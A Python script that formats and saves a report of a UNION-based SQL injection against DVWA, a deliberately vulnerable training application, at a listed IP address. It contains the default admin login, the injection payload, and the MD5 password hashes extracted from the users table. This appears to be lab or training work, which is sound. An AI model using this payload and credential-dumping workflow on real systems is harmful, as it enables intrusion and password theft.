
import json
from datetime import datetime

# All extracted user data from the DVWA database
extracted_data = {
    "target": "http://31.97.117.123",
    "application": "DVWA (Damn Vulnerable Web Application) v1.10",
    "extraction_method": "SQL Injection (UNION-based)",
    "extraction_date": datetime.now().isoformat(),
    "authentication": {
        "method": "Default credentials",
        "username": "admin",
        "password": "password",
        "attempts_before_success": 2
    },
    "vulnerability": {
        "type": "SQL Injection (UNION-based)",
        "location": "/vulnerabilities/sqli/",
        "parameter": "id",
        "injection_payload": "1' UNION SELECT user, password FROM users -- ",
        "security_level": "low",
        "phpids": "disabled"
    },
    "users_extracted": [
        {
            "username": "admin",
            "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
            "hash_type": "MD5",
            "status": "active"
        },
        {
            "username": "gordonb",
            "password_hash": "e99a18c428cb38d5f260853678922e03",
            "hash_type": "MD5",
            "status": "active"
        },
        {
            "username": "1337",
            "password_hash": "8d3533d75ae2c3966d7e0d4fcc69216b",
            "hash_type": "MD5",
            "status": "active"
        },
        {
            "username": "pablo",
            "password_hash": "0d107d09f5bbe40cade3de5c71e9e9b7",
            "hash_type": "MD5",
            "status": "active"
        },
        {
            "username": "smithy",
            "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
            "hash_type": "MD5",
            "status": "active"
        }
    ],
    "summary": {
        "total_users_found": 5,
        "unique_hashes": 4,
        "users_with_shared_passwords": [
            {
                "hash": "5f4dcc3b5aa765d61d8327deb882cf99",
                "users": ["admin", "smithy"]
            }
        ]
    }
}

print("\n" + "=" * 100)
print("COMPREHENSIVE SECURITY ASSESSMENT REPORT")
print("=" * 100)

print("\n[*] TARGET INFORMATION:")
print(f"    - URL: {extracted_data['target']}")
print(f"    - Application: {extracted_data['application']}")
print(f"    - Extraction Date: {extracted_data['extraction_date']}")

print("\n[*] AUTHENTICATION:")
print(f"    - Method: {extracted_data['authentication']['method']}")
print(f"    - Successful Credentials: {extracted_data['authentication']['username']}:{extracted_data['authentication']['password']}")
print(f"    - Attempts Required: {extracted_data['authentication']['attempts_before_success']}/10")

print("\n[*] VULNERABILITY DETAILS:")
print(f"    - Type: {extracted_data['vulnerability']['type']}")
print(f"    - Location: {extracted_data['vulnerability']['location']}")
print(f"    - Parameter: {extracted_data['vulnerability']['parameter']}")
print(f"    - Security Level: {extracted_data['vulnerability']['security_level']}")
print(f"    - PHPIDS Protection: {extracted_data['vulnerability']['phpids']}")

print("\n[*] EXPLOITATION PAYLOAD:")
print(f"    {extracted_data['vulnerability']['injection_payload']}")

print("\n[*] EXTRACTED USERS TABLE:")
print("-" * 100)
print(f"{'#':<3} {'Username':<15} {'Password Hash':<40} {'Hash Type':<10} {'Status':<10}")
print("-" * 100)

for idx, user in enumerate(extracted_data['users_extracted'], 1):
    print(f"{idx:<3} {user['username']:<15} {user['password_hash']:<40} {user['hash_type']:<10} {user['status']:<10}")

print("-" * 100)

print("\n[*] SUMMARY STATISTICS:")
print(f"    - Total Users Found: {extracted_data['summary']['total_users_found']}")
print(f"    - Unique Password Hashes: {extracted_data['summary']['unique_hashes']}")
print(f"    - Users with Shared Passwords: {len(extracted_data['summary']['users_with_shared_passwords'])}")

print("\n[*] PASSWORD REUSE DETECTED:")
for shared in extracted_data['summary']['users_with_shared_passwords']:
    users_str = ", ".join(shared['users'])
    print(f"    - Hash: {shared['hash']}")
    print(f"      Users: {users_str}")

print("\n" + "=" * 100)
print("[+] MISSION ACCOMPLISHED - ALL DATA EXTRACTED SUCCESSFULLY")
print("=" * 100)

# Save to JSON file
with open('/tmp/dvwa_extraction_report.json', 'w') as f:
    json.dump(extracted_data, f, indent=2)
    
print("\n[+] Report saved to: /tmp/dvwa_extraction_report.json")


